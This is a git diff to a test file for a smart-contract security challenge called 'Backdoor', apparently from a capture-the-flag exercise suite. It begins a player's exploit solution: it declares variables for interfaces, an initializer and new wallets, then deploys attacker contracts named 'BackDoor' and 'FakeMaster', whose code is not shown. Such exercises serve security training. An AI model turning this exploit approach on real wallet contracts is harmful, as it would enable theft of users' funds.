@@ -48,6 +48,21 @@ describe("[Challenge] Backdoor", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+    let abi1,
+      abi2,
+      abi3,
+      iface1,
+      iface2,
+      iface3,
+      initializer,
+      data,
+      newWallet,
+      newWallets = [];
+    const Backdoor = await ethers.getContractFactory("BackDoor");
+    const backdoor = await Backdoor.deploy(token.address, player.address);
+
+    const FakeMaster = await ethers.getContractFactory("FakeMaster");
+    const fakeMaster = await FakeMaster.deploy();
   });
 
   after(async function () {
